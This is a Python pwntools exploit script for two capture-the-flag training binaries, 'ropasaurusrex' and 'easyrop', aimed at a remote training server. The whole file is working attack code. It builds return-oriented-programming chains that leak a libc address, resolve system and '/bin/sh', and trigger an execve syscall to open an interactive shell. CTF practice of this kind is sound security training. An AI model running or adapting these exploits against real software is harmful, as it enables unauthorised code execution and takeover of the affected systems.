import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ["exo-open", "--launch", "TerminalEmulator"]

class switcher():
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def ropasaurusrex(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2014)
        else:
            r = process("./" + args.binary, env={"LD_PRELOAD": "./libc-2.27.so"})
            gdb.attach(r, """
            b *0x0804841c
            c
            """)
            input("Press any key to continue.")
        
        write = 0x0804830c
        arg1 = 1
        arg2 = 0x08049614
        arg3 = 4
        gadget = 0x080484b6
        main = 0x80483f4

        payload = p32(write) + p32(gadget) + p32(arg1) + p32(arg2) + p32(arg3) + p32(main)
        payload = b"".ljust(140, b"\x90") + payload

        r.send(payload)

        write_got = u32(r.recv(4))
        libc = ELF('./libc-2.27.so')
        libc.address = write_got - libc.symbols['write']
        system = libc.symbols['system']
        binsh = next(libc.search(b'/bin/sh'))

        print("[!] write_got: 0x%08x" % write_got)
        print("[!] libc_base: 0x%08x" % libc.address)
        print("[!] system: 0x%08x" % system)
        print("[!] binsh: 0x%08x" % binsh)

        time.sleep(0.1)

        payload = p32(system) + b"EXIT" + p32(binsh)
        payload = b"".ljust(140, b"\x90") + payload

        r.send(payload)
        r.interactive()
    
    @classmethod
    def easyrop(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2015)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x4001c2
            c
            """)

            input("Press any key to continue.")
        
        def e64(address):
            r.send(b"\x00\x00\x00\x00")
            time.sleep(0.1)
            r.send(p32(address))
            time.sleep(0.1)
            r.send(b"\x00\x00\x00\x00")
            time.sleep(0.1)
            r.send(b"\x00\x00\x00\x00")
            time.sleep(0.1)

        for i in range(0,14):
            r.send(b"\x00\x00\x00\x00")
            time.sleep(0.1)
            r.send(b"".ljust(4, b"\x90"))
            time.sleep(0.1)

        e64(0x4001c2)
        e64(0x0)
        e64(0x00600370)
        e64(0x8)
        e64(0x0)
        e64(0x00400144)
        e64(0x4001c2)
        e64(0x00600370)
        e64(0x0)
        e64(0x0)
        e64(0x3b)
        e64(0x400168)

        r.send("\n")
        time.sleep(0.1)
        r.send("\n")
        time.sleep(0.1)

        r.send(b"/bin/sh\x00")
        
        r.interactive()

switcher.indirect(parser.parse_args())
